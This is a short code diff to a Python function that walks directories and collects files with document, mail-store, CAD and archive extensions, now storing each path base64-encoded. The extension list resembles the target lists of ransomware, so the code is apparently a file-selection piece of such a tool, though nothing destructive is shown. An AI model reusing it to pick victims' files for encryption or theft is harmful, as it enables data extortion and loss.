@@ -2,7 +2,9 @@
 # coding=UTF-8
 
 import os
+import base64
 
+# return the base64 encoded path of the files
 def find_files(path):
     file_format = {'.DOC': 0, '.DOCX': 0, '.XLS': 0, '.XLSX': 0, '.PPT': 0, '.PPTX': 0, '.PST': 0, '.OST': 0, '.MSG': 0, '.EML': 0, '.VSD\
 ': 0, '.VSDX': 0, '.TXT': 0, '.CSV': 0, '.RTF': 0, '.WKS': 0, '.WK1': 0, '.PDF': 0, '.DWG': 0, '.ONETOC2': 0, '.SNT': 0
@@ -27,6 +29,7 @@ SXC': 0, '.OTS': 0, '.ODS': 0, '.3DM': 0, '.MAX': 0, '.3DS': 0, '.UOT': 0, '.STW
         for arq in files_found:
             extensao = os.path.splitext(os.path.join(actual_path, arq))[1].upper()
             if(file_format.get(extensao) == 0 or extensao == ''):
-                files.append(os.path.join(actual_path, arq))
+                encoded_path = base64.b64encode(os.path.join(actual_path, arq))
+                files.append(encoded_path)
 
     return files
